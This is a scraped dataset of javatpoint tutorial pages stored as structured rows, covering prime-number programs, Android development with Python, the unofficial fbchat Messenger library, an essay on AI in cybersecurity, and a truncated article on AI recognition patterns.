factors of the second number entered by user:  [7, 97]', 'Enter first natural number: 73', 'Enter second natural number: 279', 'The lowest prime factor of the first number entered by user:  73', 'The first prime factor of the second number entered by user:  3', 'Enter first natural number: 15', 'Enter second natural number: 18', 'Following are all prime numbers that are either less than or equal to 15 as given by the user :  [2, 3, 5, 7, 11, 13]', 'Following are all prime numbers that are either less than or equal to 18 as given by the user :  [2, 3, 5, 7, 11, 13, 17]', 'The number of first prime numbers you want to print: 7', 'These are first 7 prime numbers as the number entered by the user:  [2, 3, 5, 7, 11, 13, 17]', 'Enter first natural number: 5', 'Enter second natural number: 41', 'Enter third natural number: 79', 'These are all prime numbers which are present between first and second number given by you:  [5, 7, 11, 13, 17, 19, 23, 29, 31, 37]', 'These are all prime numbers which are present between the second and third number given by you:  [41, 43, 47, 53, 59, 61, 67, 71, 73]']",[],[]
430,['Android Development using Python'],"['Many of us aspire to develop applications; however, most are stuck with the Java programming language. It is a matter of fact or, say, a living reality that we cannot know everything in this world. And it is fine to not aware if there is a substitute for it. The alternative that we are talking about here is the Python programming language that we can use instead of Java. Now, a doubt might arise - Is it possible to make an Android Application with the help of Python? The definite answer to this question is - Yes.']","['https://www.javatpoint.com/python-fbchat-library', 'https://www.javatpoint.com/python-primepy-module', 'https://www.javatpoint.com/python-fbchat-library', 'https://www.javatpoint.com/python-primepy-module', 'https://www.javatpoint.com/python-fbchat-library']",[],[],"['What is the Python programming language?', 'Android Application with Python', 'Some Problems in Developing Android Apps using Python']","['QPython', 'PySide', 'PyMob', 'Pyqtdeploy', 'Kivy']",[],"['Some of the platforms used for Android Development using Python are as follows:', 'Some of the problems that might arise are as follows:']","['In this tutorial, we will be discovering interesting facts about Android Development with the help of the Python programming language. So, let us begin by understanding Python in brief.', 'QPython is a script engine that executes Python on Android devices. It consists of the Python interpreter, console, editor, and the SL4A Library for Android development. It lets the Android device run scripts and projects based on Python.', 'Pyside is a Python library that allows programmers to create cross-platform graphical user interfaces (GUIs). It is a Python binding to the QT framework. QT library is among the most powerful GUI libraries. It was developed by Digia and QT Project.']","['It is possible to develop an application based on Android using Python. Moreover, the technology is not only limited to Python; in fact, we can develop Android applications in various programming languages other than Java. One interesting fact is that Python on android is much easier than Java and much better when it comes to complexity.', 'Let us now understand it in depth. The primary thing to understand is that we can use different programming languages for Android application development. These languages include - Java, Kotlin, C, C++, C#, Python, Lua, Corona, HTML5, JavaScript, and various others. Moreover, these languages are easy to understand and use. There are various Integrated Development Environments (IDEs) that we can use for Android Development. IDE is an environment that allows programmers to develop applications, in this case, Android applications.', 'Python is a famous object-oriented and high-level programming language. Python was created by Guido van Rossum and released in the year 1991. It is a simple language that is easy to learn and understand. Python can work on Windows, Linux, MacOS, Raspberry Pi, and others. It works on an interpreter system, which means we can easily execute the code as soon as we write it. Python is a quick language providing much easier syntax than any other language.', 'Since android applications are to be operated on the Android Operating System and start developing Android applications using Python, we need platforms that allow us to write the codes completely in Python. Fortunately, various platforms allow developers in web development, app development, analysis, and computation of scientific and numeric data and software development.', 'PyMob is an open-source software library used to assess the atomic mobility parameters for CALPHAD-type Kinetic Databases with the help of the raw data, which are the experimental tracer diffusion coefficients. The software consists of an entirely automated assessment procedure.', 'Pyqtdeploy is a utility that allows the deployment of PyQt applications written with Python v3.5 or above in conjunction with other utilities offered with QT. It supports deployment to desktop platforms (like Linux, Windows, and MacOS) and mobile platforms (like Android and iOS).', 'Kivy is a free and open-source Python framework used to develop mobile applications and other multi-touch application software using a natural user interface. It is distributed under the terms of the MIT License and can work on Android, iOS, Linux, MacOS, and Windows.', 'Apart from these above, some other tools support developers in writing code that can work on the Android Operating System. All these platforms generate a native source code for their supported platforms. The native code that is generated is identical to a hand-written script, and it can be easily optimized by using native compilers.', ""We all know that Java is the official programming language for Android, as Google declared it. Java for Android is like that Standard of Android, and other languages that we utilize might not be as up to the mark as Java. Though Android development using Python is possible, it won't be as efficient as developing Android applications using Java.""]",[],[],[],"['|||These frameworks might not support every feature of the Android operating system.|||We cannot utilize our tools always.|||These codes might not run very fast as they generate the native code at first, which are then optimized with the help of the native compilers.|||Sometimes the High-level graphics might not be supported, and at times 2D and 3D graphic support are also not present.|||']"
431,['Python fbchat library'],"['The power of a programming language like Python comes because of the wide range of modules and libraries it offers to its users. This time we are going to explore one of those. There might be one time or another when every one of us has a wish of the message (or spamming) our Facebook friend. Being able to automate activities and making supporting bots in Facebook messenger appears to be interesting. In the following tutorial, we will understand how we can connect in Facebook messenger using the Python programming language and perform a variety of mind-blowing things.']","['https://www.javatpoint.com/artificial-intelligence-in-cybersecurity-pitting-algorithms-vs-algorithms', 'https://www.javatpoint.com/android-development-using-python', 'https://www.javatpoint.com/https://www.facebook.com/messages/', 'https://www.javatpoint.com/https://fbchat.readthedocs.io/en/stable/intro.html', 'https://www.javatpoint.com/artificial-intelligence-in-cybersecurity-pitting-algorithms-vs-algorithms', 'https://www.javatpoint.com/android-development-using-python', 'https://www.javatpoint.com/artificial-intelligence-in-cybersecurity-pitting-algorithms-vs-algorithms']",[],[],['An Introduction to the Python fbchat library'],"['Logging In', 'Understanding Threads', 'Understanding the Message IDs', 'Interaction with Threads', 'Fetching Information', 'Understanding Sessions', 'Listening and Events']","['Note: We can identify the event methods by them on prefix. For example, onMessage.', 'Note: Hence, for both backward and forward compatibility, the API requires us to include **kwargs as the final parameter.']","[""So, let's get started."", 'In order to install the fbchat library, we will be using the pip installer following the command shown below:', 'In order to verify the library is installed properly, we can create a new file and add the import statement to see if it returns any errors or not.', 'File: verify.py', 'Now, save the Python file and run the execution command using the command prompt:', 'Now, let us understand the basics of the fbchat library.', 'Let us now see the same in the following syntax:', 'Explanation:', 'The incorrect username and password may lead to an exception while connecting to the Facebook account.', 'Throughout the code, if we would like to check if we are still logged in, we can use the isLoggedIn() function of the Client class.', 'We can use the login() function of the Client class in order to log in to the Facebook account.', 'Let us consider the following example where we want to log in again if logged out.', 'Explanation:', 'Once we are done utilizing the client and want to securely logout, we will use the logout() function.', 'The syntax for the same is shown below:', 'Explanation:', 'In the above snippet of code, we have used the logout() function of the Client class along with the object of the Client in order to log out.', 'A Thread can be considered two things: A Messenger group chat or a single Facebook user.', 'We can retrieve our User ID with the help of the uid method of the Client class.', 'We can apply the same method to several user accounts, though we will just see that URL if they have set a custom URL.', 'Let us consider the following snippet of code demonstrating the utilization of the thread IDs and the thread types.', 'Explanation:', 'Let us consider the following example demonstrating the same:', 'Explanation:', 'Some of the functions of the fbchat library need these IDs, like reactToMessage, and some of them provide this ID, like sendMessage.', 'Let us consider the following example demonstrating the use of these functions.', 'Explanation:', 'The fbchat library offers different functions in order for us to interact with threads.', 'Some of the functions used for interacting with threads are described in the following table:', 'Let us consider the following example demonstrating the use of the above function in interacting with threads.', 'Explanation:', 'Now, let us understand how we can fetch information using the fbchat library.', 'Explanation:', 'Since this example utilizes the search functions of Facebook, we do not have to specify the complete name; first names will usually be enough.', 'Let us now understand the Sessions.', 'We can retrieve the cookies using the getSession function of the Client class. The syntax for the same is shown below:', 'Then we can use the setSession function of the Client class in order to set the session. The syntax for the same is shown below:', 'Or we can set the session_cookies on the initial login. (If the session cookies are invalid, the email and password will be used to log in instead):', 'Warning: The session cookies can be as valuable as the password, so store them with equal care.', 'We can change the event actions by subclassing the Client and then overwriting the event methods as shown below:', 'Explanation:', 'The onMessage method can work even when we alter the parameters of the method; however, we have to include **kwargs in it.', 'Further information is provided in the official documentation available at:', 'https://fbchat.readthedocs.io/en/stable/intro.html']","['The username and password provided above only demonstrate the working of the Client class and do not serve the real purpose. However, replacing the variable strings with the actual e-mail ID and password is required, respectively.', 'We can search for group chat and find their ID using the searchForGroups method of the Client class. We can also search for a user using the searchForUsers method. We will look into it later in this tutorial.', 'Every message we send on Facebook consists of a unique ID, and every activity we perform in a thread, such as changing a nickname or adding a person, has a unique ID.', 'Most functionality works on all threads, though some things, such as adding users to and removing users from a group chat, logically work on the group chats only.', 'We can utilize the fbchat library in order to fetch basic information regarding the users, such as their usernames, profile pictures, thread names, and user IDs.', ""We can retrieve a User's ID using the searchForUsers function of the Client class. Let us consider the following example that demonstrates the working of the functions that allows us to fetch information of the Users."", 'The fbchat library offers the functions in order to retrieve and set the session cookies. This function will allow us to store the session cookies in a separate file so that we do not have to log in every time we begin the script.']","['This statement implies we will perform the same GET/POST requests and trick Facebook into thinking it is accessing the website normally. We will need a Python library known as fbchat that allows programmers to emulate the browser for this operation. Therefore, this Application Programming Interface (API) is not official, and it does not require any API key. However, it requires the credentials of the Facebook account.', 'The fbchat library in the Python programming language utilizes the e-mail ID and password in order to communicate with the Facebook server. This statement means that we should always store the password in a separate file if someone is sneaking into it while writing the code. We should also make sure that the access control of the file is appropriately restrictive.', 'If the above Python file does not raise any import error, we are good to go and head onto the Facebook messenger bot building procedure. However, if it does raise an exception, it is recommended to reinstall the library and refer to its official documentation.', 'We can simply create an instance of the Client class of the fbchat library. If we have two-factor authentication enabled, we need to type the code in the terminal prompt (In case we want to supply the code in another fashion, we can overwrite the Client.on2FACode function.', 'In the above snippet of code, we have imported the Client class from the fbchat library along with the functions from fbchat.models. We have defined the username and password of the Facebook account. At last, we have created an object of the Client class specifying the username and password as its parameters which allows us to access the Facebook account.', 'In the above snippet of code, we have used the if statement to check if we are logged in to the Facebook account or not using the isLoggedIn() function. We have also used the login() function specifying the username and password to log in again if we are logged out.', 'ThreadType is an enumerator with two values. The first value is USER, and the other is GROUP. These will specify whether the thread is a single-user or group chat. This is required for multiple functions of the fbchat library as Facebook can differentiate between these two internally.', 'We can also retrieve the Group chat ID. However, the procedure for the same is quite trivial. As we only have to navigate to https://www.facebook.com/messages/, we will then have to click on the group we want to find the ID of and then read ID from the address bar. The URL will appear something like this: https://www.facebook.com/messages/t/123456789, where 123456789 would be the ID of the group chat.', 'In the above snippet of code, we have started importing the required library and providing the username and password. We have then created an object of the Client class. Later, we used the send() function specifying the text message along with the thread ID and the thread type as USER and GROUP. At last, we have logged out using the logout() function.', 'We can observe that we have provided the thread ID and the thread type to initiate the function. However, there are some functions that do not require a thread type at all. One such function can be changeThreadColor. In such a case, we have to provide the thread ID.', 'In the above snippet of code, we have imported the required modules and provided the username and password. We have then created an object of the Client class. We have then used the changeThreadColor function of the Client class in order to change the colors of the thread. We have specified the Thread color and the thread ID within the function. At last, we have logged out using the logout() function.', 'In the above snippet of code, we have imported the required methods and provided the username and password. We have then created an object of the Client class. We have then retrieved the message ID using the send() function. We have then used the message ID in order to react to the message with the help of the reactToMessage(), where we have specified the messageID along with the MessageReaction as LOVE emoji.', 'In the above snippet of code, we have imported the required modules and provided the username and password. We created an instance of the Client class and specified the Thread ID and type. We have then used different functions in order to interact with the thread ranging from sending a text message and emoji to changing the Thread color and emoji. Since we are working on a GROUP chat, we have also used the operations involving adding and removing the Users from the group. We have also used the functions for sending the image available locally as well as on a specific URL.', 'In the above snippet of code, we have imported the required modules and created an instance of the Client class. We have then used the searchForUsers function in order to retrieve the User ID. We have then stored the value of the first user in a variable. At last, we have printed the information of the user using the uid, name, photo, url functions.', 'The fbchat library also offers listening functions like the listen function of the Client class that we need to define what should be executed when certain events occur. By default, (most) events will just be a logging.info statement, meaning it will simply print details to the console when an event occurs.', 'We have defined a subclass of the Client class as Custom_Client in the above syntax. Within the class, we have defined a method as onMessage that accepts multiple parameters like self, mid, author_id, message_object, thread_id, thread_type, ts, metadata, msg, and **kwargs. One can write some functionalities within this method. At last, we have instantiated the Custom_Client class passing the username and password as its arguments.']","['$ pip3 install fbchat', 'import fbchat', '$ python verify.py', '# importing the required modules', 'from fbchat import Client', 'from fbchat.models import *', '# input username and password of the Facebook account', 'username = ""example@website.com""', 'password = ""password2email""', '# creating an object of the Client class', 'clientObj = Client(username, password)', '# importing the required modules', 'from fbchat import Client', 'from fbchat.models import *', '# input username and password of the Facebook account', 'username = ""example@website.com""', 'password = ""password2email""', '# creating an object of the Client class', 'clientObj = Client(username, password)', '# checking if we are logged in or not', 'if not clientObj.isLoggedIn():', '# logging in using the login() function', 'clientObj.login(username, password)', '# importing the required modules', 'from fbchat import Client', 'from fbchat.models import *', '# input username and password of the Facebook account', 'username = ""example@website.com""', 'password = ""password2email""', '# creating an object of the Client class', 'clientObj = Client(username, password)', '# logging out', 'clientObj.logout()', '# importing the required modules', 'from fbchat import Client', 'from fbchat.models import *', '# input username and password of the Facebook account', 'username = ""example@website.com""', 'password = ""password2email""', '# creating an object of the Client class', 'clientObj = Client(username, password)', '# sending some message to user and group', ""clientObj.send(Message(text = 'some message'), thread_id = '', thread_type = ThreadType.USER)"", ""clientObj.send(Message(text = 'some message'), thread_id = '', thread_type = ThreadType.GROUP)"", '# logging out', 'clientObj.logout()', '# importing the required modules', 'from fbchat import Client', 'from fbchat.models import *', '# input username and password of the Facebook account', 'username = ""example@website.com""', 'password = ""password2email""', '# creating an object of the Client class', 'clientObj = Client(username, password)', '# changing the Thread Colors', ""clientObj.changeThreadColor(ThreadColor.BRIGHT_TURQUOISE, thread_id = '')"", ""clientObj.changeThreadColor(ThreadColor.DARK_TANGERINE, thread_id = '')"", '# logging out', 'clientObj.logout()', '# importing the required modules', 'from fbchat import Client', 'from fbchat.models import *', '# input username and password of the Facebook account', 'username = ""example@website.com""', 'password = ""password2email""', '# creating an object of the Client class', 'clientObj = Client(username, password)', '# getting the message ID', ""messageID = clientObj.send(Message(text = 'message'), thread_id = clientObj.uid, thread_type = '')"", '# using the message ID to react to message', 'clientObj.reactToMessage(messageID, MessageReaction.LOVE)', '# logging out', 'clientObj.logout()', '# importing the required modules', 'from fbchat import Client', 'from fbchat.models import *', '# input username and password of facebook account', 'username = ""example@website.com""', 'password = ""password2email""', '# creating an object of Client class', 'clientObj = Client(username, password)', '# specifying the thread ID and type', 'threadID = ""1234567890""', 'threadType = ThreadType.GROUP', '# sending a message to the thread', 'clientObj.send(', 'Message(text = ""some text message""),', 'thread_id = threadID,', 'thread_type = threadType', '# sending the emoji `👍`', 'clientObj.send(', 'Message(text = ""👍"", emoji_size = EmojiSize.LARGE),', 'thread_id = threadID,', 'thread_type = threadType', '# sending the sticker with ID `767334476626295`', 'clientObj.send(', 'Message(sticker = Sticker(""767334476626295"")),', 'thread_id = threadID,', 'thread_type = threadType', '# sending a message with a mention', 'clientObj.send(', 'Message(', 'text = ""An example of @mention"",', 'mentions = [Mention(', 'threadID,', 'offset = 10,', 'length = 8', ')]),', 'thread_id = threadID,', 'thread_type = threadType', '# sending the image located at `<path_to_image_file>`', 'clientObj.sendLocalImage(', '""<path_to_image_file>"",', 'message = Message(text = ""This is a local image""),', 'thread_id = threadID,', 'thread_type = threadType', '# downloading the image at the URL `<url_to_image_file>`, and then sending it', 'clientObj.sendRemoteImage(', '""<url_to_image_file>"",', 'message = Message(text = ""This is a remote image""),', 'thread_id = threadID,', 'thread_type = threadType', '# Only do these actions if the thread is a group', 'if threadType == ThreadType.GROUP:', '# removing the user with ID `<user_id>` from the thread', 'clientObj.removeUserFromGroup(""<user_id>"", thread_id = threadID)', '# adding the user with ID `<user_id>` to the thread', 'clientObj.addUsersToGroup(""<user_id>"", thread_id = threadID)', '# adding the users with IDs `<First_user_id>`, `<Second_user_id>` and `<Third_user_id>` to the thread', 'clientObj.addUsersToGroup(', '[""<First_user_id>"", ""<Second_user_id>"", ""<Third_user_id>""], thread_id = threadID', '# changing the nickname of the user `<user_id>` to `<new_nickname>`', 'clientObj.changeNickname(', '""<new_nickname>"", ""<user_id>"", thread_id = threadID, thread_type = threadType', '# changing the title of the thread to `<title>`', 'clientObj.changeThreadTitle(""<some_title>"", thread_id = threadID, thread_type = threadType)', '# setting the typing status of the thread to `TYPING`', 'clientObj.setTypingStatus(', 'TypingStatus.TYPING,', 'thread_id = threadID,', 'thread_type = threadType', '# changing the thread color to `RADICAL_RED`', 'clientObj.changeThreadColor(ThreadColor.RADICAL_RED, thread_id = threadID)', '# changing the thread emoji to `👍`', 'clientObj.changeThreadEmoji(""👍"", thread_id = threadID)', '# reacting to a message with a 😍 emoji', 'clientObj.reactToMessage(""<messageID>"", MessageReaction.LOVE)', '# importing the required modules', 'from fbchat import Client', 'from fbchat.models import *', '# input username and password of facebook account', 'username = ""example@website.com""', 'password = ""password2email""', '# creating an object of Client class', 'clientObj = Client(username, password)', '# retrieving the User IDs', ""the_users = clientObj.searchForUsers('')"", 'the_user = the_users[0]', '# printing the information of the User', 'print(""User ID: {}"".format(the_user.uid))', 'print(""Name of the User: {}"".format(the_user.name))', 'print(""Profile picture URL of the User: {}"".format(the_user.photo))', 'print(""Main URL of the URL: {}"".format(the_user.url))', 'sessionCookies = clientObj.getSession()', 'clientObj.setSession(sessionCookies)', ""clientObj = Client('<email_ID>', '<password>', session_cookies = sessionCookies)"", '# creating a subclass of the Client class', 'class Custom_Client(Client):', 'def onMessage(self, mid, author_id, message_object, thread_id, thread_type, ts, metadata, msg, **kwargs):', '# Perform something with message_object here', 'pass', '# creating an instance of Custom_Client class', ""clientObj = Custom_Client('<email_ID>', '<password>')""]",[],['S. No.|||Function|||Description&&&1|||send|||This function is used to send messages to a user or a group.&&&2|||sendLocalImage|||This function is used to send an Image located locally.&&&3|||sendRemoteImage|||This function is used to download an Image from URL and send it.&&&4|||addUsersToGroup|||This function is used to add one or many users to the group.&&&5|||removeUserFromGroup|||This function is used to remove a user from the group.&&&6|||changeNickname|||This function is used to change the nickname of the user.&&&7|||changeThreadTitle|||This function helps in changing the title of the Thread.&&&8|||setTypingStatus|||This function helps in setting up the status of Typing either to TYPING or STOPPED.&&&9|||changeThreadColor|||This function is used to change the color of the Thread.&&&10|||changeThreadEmoji|||This function helps in changing the emoji in the Thread.&&&11|||reactToMessage|||This function helps in reacting to a message.'],[]
432,['Artificial Intelligence in Cybersecurity: Pitting Algorithms vs Algorithms'],"[""Artificial Intelligence in cybersecurity is revolutionizing how we look at protecting ourselves against dark-hat hackers and hackers with malicious motives. It's important to take a focused strategy when it comes to cybersecurity. From a technical standpoint, it's important to take a comprehensive approach to security, where companies know the various algorithms available to create an enhanced security ecosystem.""]","['https://www.javatpoint.com/understanding-recognition-pattern-of-artificial-intelligence', 'https://www.javatpoint.com/python-fbchat-library', 'https://www.javatpoint.com/understanding-recognition-pattern-of-artificial-intelligence', 'https://www.javatpoint.com/python-fbchat-library', 'https://www.javatpoint.com/understanding-recognition-pattern-of-artificial-intelligence']",[],[],"['The Evolving Nature of Cybercrime', 'Better Prediction through Artificial Intelligence', 'Enhancing the Scope of Artificial Intelligence in Cybersecurity', 'Artificial Intelligence in Cyber Policies', 'Strengthening Models of Defence', 'Conclusion']","['Clouds, VPN, and AI Cybersecurity', 'AI to investigate hacking behaviours']",[],"['- Gaurav Banga, CEO and founder of Balbix', '- Lydia Ragoonanan, The Director of LORCA', 'As Artificial Intelligence software gets more advanced, the capabilities of AI expand as well.', '- Scott Lathrop, Senior Researcher AI.']",[],"[""It is essential to know the best way to implement anti-attack measures to ensure that every attack can be identified and stopped at a rapid time. Since timing the actions is essential, companies must expand their cyber security procedures to ensure there aren't any lapses in the steps implemented. This is the case for smaller to mid-sized companies focused specifically on security from a technical perspective. They do not create a value-based system that can be an important resource for the company. They rather focus on constructing strategies that focus on engaging on a necessity-only basis."", ""It's the reason algorithms are being created to enhance the quality of security. In a time when cybersecurity is a must, it's crucial to take an increased position. Algorithms are the sole tool that will allow businesses to improve their cybersecurity measures. In addition, businesses can improve their current security by leveraging third-party companies that can create excellent strategies for you. This makes the process shorter and helps in better control of cybersecurity threats."", ""The field of cybersecurity, it's growing rapidly. It is due to attacks becoming more sophisticated and more attackers emerging out of the apex. This is why cybersecurity professionals have to be aware of how cybersecurity evolves. Cybercrime is shifting to newer trends, such as crypto-jacking and ransomware, at increasing alarming rates of growth."", 'Cybercrimes have been developed to capture information from various sources and publish data through dark websites. Many of the most renowned tech firms of all time have been compromised, and countermeasures are implemented every day. But, there must be a more comprehensive approach to cybersecurity. That is the kind of thing that Artificial Intelligence in cybersecurity can provide. While hackers employ their algorithms to attack systems, cybersecurity professionals employ their own. This is the reason the battle of algorithms is waged, with technology being employed to its fullest potential.', ""Artificial Intelligence is also enabling technologists to create an internet that is more secure. A world where information is safe and leaks aren't a problem can be a positive factor for the good of the business. Societies are also safer as they know that hackers don't have access to the systems that hold sensitive data. Because information is a valuable resource, companies must use top-of-the-line security to make sure there aren't any leaks or data leaks."", ""This is an excellent tool that lets us discover vulnerabilities that might be in the cybersecurity realm. It aids us in making more accurate predictions in relation to crime. Additionally, it allows cyber-security experts to determine their next steps before the attack. It is also possible to have attacks on day 0, which are passive. They can be stopped and eliminated from the system through running Artificial Intelligence algorithms. Because the number of victims is huge and there are many possible endpoints, it's suggested to employ the AI algorithm in order to guarantee adequate security."", 'AI model. Predictive analytics can also assist us in gaining a legal perspective. It lets cybersecurity experts view hackers from a different view. It provides a deeper understanding of security that is platform-centric to cyberspace. It also lets us discover new ways of protecting ourselves based on the predictions that are made by AI models.', 'Artificial Intelligence, in turn, will also be able to create better systems that actively look for weaknesses. Hackers will be stopped from entering since more and more entrances are shut off. They also have the ability to maintain an ongoing supply of AI-enabled devices that will continue to play the role of security threat detection. The overall model gets better as time passes because the AI system gains knowledge from the information it is presented.', 'The platform is taking a more proactive approach to enable AI systems to extend their full potential. In addition, there is a greater emphasis being placed on the AI systems that are part of the platform. This provides them with more control over their systems and allows for an automatic response following detection. Also, the AI system is able to detect and take action to ward off threats without the need for intervention.', 'Companies must investigate the potential of AI for their cybersecurity infrastructure. AI can improve cybersecurity while also putting a greater concentration on communication. Research suggests the majority of security alerts go without being noticed, while less than 23% of organizations respond only in the time of a crisis. The concept of cybersecurity must change to provide a complete strategy for security management.', 'It also implies that there must be a greater emphasis on AI for cybersecurity. With the introduction of new technologies and advanced algorithms, there will be a race to see who is more powerful. When AI is able to go through all the files of a system and spot dangers before they appear in the system, the entire ecosystem gets substantially more robust. Furthermore, there are more opportunities for teams in general since AI provides more details in the form of feedback.', 'More tools for cyber-teams can incorporate the data back to the AI algorithm. This improves the performance of the platform can be used the possibility of greater Machine Learning integration. At present, approximately 20% of executives in the C-suite use ML to improve their AI offerings. This is why there must be an expansion of the range when it comes down to AI and its capabilities. AI must have a greater range and more coordinated approach to threat detection.', 'In terms of the capabilities of Artificial Intelligence, companies must examine their current technology. They must assess whether they are prepared with regard to Artificial Intelligence and their cybersecurity measures. In addition, there is a requirement for cybersecurity experts to increase the reach of each business. The business needs to be more active regarding cybersecurity strategies. Also, it must add greater control over the elements which are not related to cybersecurity.', ""To ensure the correct execution of policy and Artificial Intelligence enhanced safeguards, AI could be employed to create better rules. AI can be utilized to increase the work capabilities that are carried out by the AI platform and to enforce more strict rules at the same time. When employees commit a lapse or upload a file, they aren't supposed to be sharing. The AI system will automatically recognize it as an anomaly and block them from doing it."", ""This is one of the less-discussed functions in the realm of cyber-compliance. AI can be utilized to help reinforce and set the guidelines by which businesses can increase their employees' compliance. By implementing specific procedures to ensure compliance locally, AI can enable companies to be more secure from the perspective of non-technological methods. It also allows businesses to increase the worth of employees by making their workplaces more trustworthy. The security net provided by AI and cyber-compliance permits employees to explore more and develop creative solutions. This is a great way to aid the development of business without noticing any obstacles from long processes and procedures. It will automatically recognize the moment a mistake was committed and attempt to repair it independently."", ""Cyber governance is a new area within the AI and cybersecurity arena and focuses on covering the greater terrain. All employees and end-points are active and more aware of the possible problems in this domain. This can also be an important way for employees to be aware that they've committed an error and try to correct the issue at a faster speed."", ""Artificial Intelligence can assist in the formulation of these cyber-policies as well as enforcing their rules from a technological perspective. It takes human errors out of the equation and creates a stronger platform for companies to analyse. Artificial Intelligence dashboards can be utilized to make sure that there aren't any technological gaps. There are other areas where AI could be able to enforce greater control over particular models. This is where Artificial Intelligence could become the dominant force and come up with creative solutions."", 'The primary need is to enhance the impact of cases we currently have within the corporate sector. We do not have the advanced tools required to build better defence mechanisms for the fundamental products. From consumer information to long procedures, the cost of cyber security increases each day. Businesses must adhere to the legislation and rules that regulate handling more information. This is where the concept of making use of AI to combat hackers came from.', 'Hackers are using advanced technologies; however, AI has ensured that the battle remains calm. This is because AI is constantly being utilized to enhance all business areas. If companies are better prepared to face the world at a higher level and are more prepared, they can fight in all areas. Most of the time, it only takes one outdated computer or an insecure network for hackers to gain access. This is why this technology is so beneficial. Technology can be implemented and revived without requiring many changes, especially with cybersecurity technologies being developed every year.', 'The strength of core models is also dependent on improving the technology itself. Technology has to become more sophisticated and sophisticated to keep pace with evolving requirements. AI is a process that can be repeated over, but a clear solutions model has to be created to ensure that the system is up-to-date. There are a variety of experts and third-party integrations which allow for greater coverage within the AI field. However, it is essential to develop an organized strategy for AI within cyber.', 'In addition, businesses need to recognize the value AI brings into the equation. This is when they begin to build on existing resources to provide a more secure environment. AI within cyberspace is vital to be executed correctly since the scope must align with the goals of the business. AI should not be viewed as an easy-to-use model. It should be a long-term objective that businesses must achieve.', 'As cloud computing has grown in adoption over the past few years, there are new problems that are emerging within the AI cybersecurity field. Many companies are launching innovative tools that offer better solutions to facilitate communication. Cloud is a single platform that has altered the way we think about technology and networking, as well as AI, being the next to follow. This has resulted in an increase in the use of other technologies, such as VPNs, as well as Machine Learning. AI is a new field that needs to be just one step behind hackers to defend new technology and platform.', 'From a cloud standpoint, the inter-connectivity level is amazing. The number of devices connected to the cloud now than before makes the task of cybersecurity much more challenging. This has resulted in an unavoidable increase in the use of AI and has made cybersecurity more possible across the cloud. Clouds are also more secure in the event that AI provides a security layer for all transactions and servers. In conclusion, you can get more security and more protection for vendors and third parties.', ""VPNs are also intended to offer security when it comes to privacy and security. However, as the growth of VPN continues, there's more requirement for cybersecurity too. As more people use VPNs are at a greater risk of being a target for hackers to make use of. This could lead to new problems arising while relying heavily on VPNs to ensure that the VPN tunnel to be secured and safe."", ""An even more thorough method is to implement AI throughout the entire process. Businesses can be relaxed because AI technology provides greater security. It can also connect to networks across the internet and ensure they're secured. The dashboard's core features give all the data needed, which eventually leads to a more cohesive platform. Cyber compliance officers can manage the field with growing confidence in the capabilities of the technology."", ""AI cybersecurity is also a unique perspective to the area. Many companies are developing new algorithms. Only a few of them are analysing the hacker's attempts. They're making use of AI as a means of research to find out the ways and reasons that pirates are able to escape. They are also able to employ AI to develop more effective traps and test mechanisms for hackers to fall for the trap. They can also study the scam from a technical perspective and discover new information they might have missed. AI experts will then be able to design more secure security measures after analysing how hackers were able to get away using the information they had stored."", 'Utilizing AI in the realm of research assists in strengthening certain areas too. Audits can be conducted by companies to ensure that their company is safe from threats and then develop solutions to keep them safe. This is a good method of ensuring that all necessary measures are in place, particularly in compliance with all laws. Cybersecurity is strengthened by investing in AI research.', ""AI for cybersecurity is a new idea that's being explored by algorithmic. Businesses are pushing to develop a complete tool to protect themselves from cybercriminals. From trojans to spyware, there is a need to be more proactive in monitoring and protection. If not, companies will be at a disadvantage in defending against such attacks."", 'There is also enormous scope for the development of AI to include new areas. By utilizing Machine Learning and Big Data, AI is opening up boundaries to expand the scope for what cybersecurity professionals can accomplish with their resources. From technology to talent, there are a variety of areas in which AI can help cybersecurity professionals increase their capabilities.']",[],[],[],[]
433,['Understanding The Recognition Pattern of Artificial Intelligence'],"[""Of the seven types of AI that illustrate the different ways that AI is implemented, one of the most popular is the recognition pattern. The principle behind recognition patterns recognized the pattern in AI involves using machine-learning as well as cognitive technologies to categorize and classify unstructured data into distinct classifications. Unstructured data could include images, videos, text, or even data that is quantitative. The reason this is so effective is that it allows machines to do what our brains do effortlessly: detect what we're seeing in the real world that surrounds us.""]","['https://www.javatpoint.com/when-and-how-to-leverage-lambda-architecture-in-big-data', 'https://www.javatpoint.com/artificial-intelligence-in-cybersecurity-pitting-algorithms-vs-algorithms', 'https://www.javatpoint.com/when-and-how-to-leverage-lambda-architecture-in-big-data', 'https://www.javatpoint.com/artificial-intelligence-in-cybersecurity-pitting-algorithms-vs-algorithms', 'https://www.javatpoint.com/when-and-how-to-leverage-lambda-architecture-in-big-data']","['https://static.javatpoint.com/python/images/understanding-recognition-pattern-of-artificial-intelligence.png', 'https://static.javatpoint.com/python/images/understanding-recognition-pattern-of-artificial-intelligence2.png', 'https://static.javatpoint.com/python/images/understanding-recognition-pattern-of-artificial-intelligence3.jpg']",[],[],['Many Applications of the Recognition Pattern'],[],[],"['The recognition pattern is used to detect counterfeit goods. Machine-learning-based recognition systems look at counterfeit goods, like sunglasses, purses, or purses to fake drugs.']","['Recognition patterns are distinctive in the sense that it was the efforts to address the problem of image recognition issues that led to an increased interest in deep learning techniques for AI and also helped start this new trend of AI investment and enthusiasm. Recognition patterns are, however, far more extensive than image recognition. In fact, we could make use of machine learning to detect and comprehend sounds, images, handwriting, objects such as faces, gestures, and facial expressions. The aim of this design is to make machines that can recognize and comprehend unstructured data. This type of AI is a major part of AI solutions due to its numerous applications.', ""The main difference between unstructured and structured data is that the structured type is labelled and is easy to read. Unstructured data, however, is where the majority of organizations have difficulty. As much as 90 percent of the data in an organization is unstructured. It is essential for companies to understand and interpret this data, which is the point at which AI can help. While we are able to use the existing query technology and informatics systems for gaining the value of analytic data in structured datasets, it isn't easy to implement these methods with data that is not structured. This is the reason machine learning is such a powerful tool when applied to these types of issues."", 'Machine learning is a powerful capability to detect patterns observed in data. Particularly, we employ methods of machine learning that are supervised to recognize this kind of pattern. In the supervised method, we make use of clean, well-labeled data to train a computer to classify inputs into distinct classes. The algorithm is exposed to a variety of information points and utilizes those data points to create an artificial neural network to classify the data into these categories. The algorithm creates neural connections among these pictures.', 'Additionally, it is shown images repeatedly with the intention to eventually allow the computer to understand the content of the image through learning. Of course, they depend on high-quality, well-labelled data that represents the type of data the resulting model will encounter during the actual world. Garbage in, garbage out in these types of systems.', 'Recognition patterns allow machine learning systems to ""look"" at data that is not structured, categorized, or classified. Finally, they understand what could be just an 